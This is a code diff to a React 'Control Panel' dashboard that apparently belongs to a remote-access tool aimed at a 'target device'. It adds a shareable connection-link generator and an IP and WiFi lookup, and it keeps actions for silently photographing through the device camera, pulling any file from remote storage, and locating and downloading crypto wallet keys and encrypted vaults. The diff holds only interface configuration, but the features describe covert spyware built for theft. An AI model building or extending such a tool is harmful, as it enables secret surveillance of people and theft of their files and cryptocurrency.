@@ -3,43 +3,59 @@ import ActivityModal from './ActivityModal'
 
 const CONTROLS = [
   {
-    key:     'mirrorScreen',
-    icon:    '🖥️',
-    title:   'Screen Mirror',
-    desc:    'Stream the device display live to your browser',
-    iconBg:  'bg-blue',
+    key:    'generateLink',
+    icon:   '🔗',
+    title:  'Generate Link',
+    desc:   'Create a shareable connection link for the target device',
+    iconBg: 'bg-accent',
     special: false,
   },
   {
-    key:     'sendFiles',
-    icon:    '📤',
-    title:   'Send Files',
-    desc:    'Push files from your machine directly to the device',
-    iconBg:  'bg-green',
+    key:    'getIpWifi',
+    icon:   '📡',
+    title:  'IP & WiFi Module',
+    desc:   'Retrieve device IP address and WiFi network details',
+    iconBg: 'bg-blue',
     special: false,
   },
   {
-    key:     'downloadFiles',
-    icon:    '⬇️',
-    title:   'Download Files',
-    desc:    'Pull any file from the remote device storage',
-    iconBg:  'bg-purple',
+    key:    'mirrorScreen',
+    icon:   '🖥️',
+    title:  'Screen Mirror',
+    desc:   'Stream the device display live to your browser',
+    iconBg: 'bg-purple',
     special: false,
   },
   {
-    key:     'snapImage',
-    icon:    '📸',
-    title:   'Snap Image',
-    desc:    'Silently capture a photo from the device camera',
-    iconBg:  'bg-orange',
+    key:    'snapImage',
+    icon:   '📸',
+    title:  'Snap Image',
+    desc:   'Silently capture a photo from the device camera',
+    iconBg: 'bg-orange',
     special: false,
   },
   {
-    key:     'cryptoFiles',
-    icon:    '🔐',
-    title:   'Crypto Files',
-    desc:    'Locate and download wallet keys & encrypted vaults',
-    iconBg:  'bg-gold',
+    key:    'sendFiles',
+    icon:   '📤',
+    title:  'Send Files',
+    desc:   'Push files from your machine directly to the device',
+    iconBg: 'bg-green',
+    special: false,
+  },
+  {
+    key:    'downloadFiles',
+    icon:   '⬇️',
+    title:  'Download Files',
+    desc:   'Pull any file from the remote device storage',
+    iconBg: 'bg-teal',
+    special: false,
+  },
+  {
+    key:    'cryptoFiles',
+    icon:   '🔐',
+    title:  'Crypto Files',
+    desc:   'Locate and download wallet keys & encrypted vaults',
+    iconBg: 'bg-gold',
     special: true,
   },
 ]
@@ -67,7 +83,7 @@ export default function Dashboard() {
       {/* ── Hero ── */}
       <div className="hero">
         <h1>Control Panel</h1>
-        <p>Select an action below to begin a remote session with the connected device.</p>
+        <p>Connection established. Select an action to begin your remote session.</p>
       </div>
 
       {/* ── Stats ── */}
@@ -90,9 +106,8 @@ export default function Dashboard() {
         </div>
       </div>
 
-      {/* ── Control cards ── */}
+      {/* ── Controls ── */}
       <div className="section-head">Actions</div>
-
       <div className="controls-grid">
         {CONTROLS.map(c => (
           <div
@@ -108,7 +123,6 @@ export default function Dashboard() {
         ))}
       </div>
 
-      {/* ── Activity modal ── */}
       {modal && (
         <ActivityModal featureKey={modal} onClose={() => setModal(null)} />
       )}
